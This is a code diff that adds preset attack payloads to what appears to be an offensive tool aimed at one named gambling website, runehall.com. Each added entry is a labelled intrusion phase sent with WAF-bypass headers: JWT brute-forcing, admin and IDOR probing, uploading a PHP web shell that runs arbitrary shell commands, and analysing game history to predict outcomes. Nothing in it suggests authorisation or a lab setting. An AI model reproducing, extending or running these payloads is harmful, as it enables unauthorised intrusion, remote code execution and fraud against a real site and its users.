@@ -121,5 +121,39 @@ export const PRESET_PAYLOADS = [
     headers: generateWafBypassHeaders(),
     concurrency: 3,
     description: "Sophisticated WAF bypass targeting reflective PHP execution and Vue source exposure."
+  },
+  {
+    name: "Phase 2: Initial Foothold (JWT Brute-force)",
+    url: "https://runehall.com/api/auth/verify",
+    method: "POST",
+    body: JSON.stringify({ token: "HEADER.PAYLOAD.SIGNATURE" }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 20,
+    description: "Rapid JWT verification attempts to identify weak signing keys or algorithm confusion."
+  },
+  {
+    name: "Phase 3: Privilege Escalation (IDOR/Admin Probe)",
+    url: "https://runehall.com/api/admin/config",
+    method: "GET",
+    headers: generateWafBypassHeaders(),
+    concurrency: 5,
+    description: "Probing for exposed administrative interfaces and IDOR vulnerabilities in config endpoints."
+  },
+  {
+    name: "Phase 4: Persistence (Web Shell Deployment)",
+    url: "https://runehall.com/api/upload/profile",
+    method: "POST",
+    body: "<?php echo shell_exec($_GET['cmd']); ?>",
+    headers: { ...generateWafBypassHeaders(), "Content-Type": "application/x-php" },
+    concurrency: 1,
+    description: "Attempting to deploy a persistent web shell via profile upload logic."
+  },
+  {
+    name: "RNG Prediction (Rigged Game Exploit)",
+    url: "https://runehall.com/api/games/crash/history",
+    method: "GET",
+    headers: generateWafBypassHeaders(),
+    concurrency: 10,
+    description: "Analyzing crash history to identify patterns in the 'rigged' self-hosted game engine."
   }
 ];
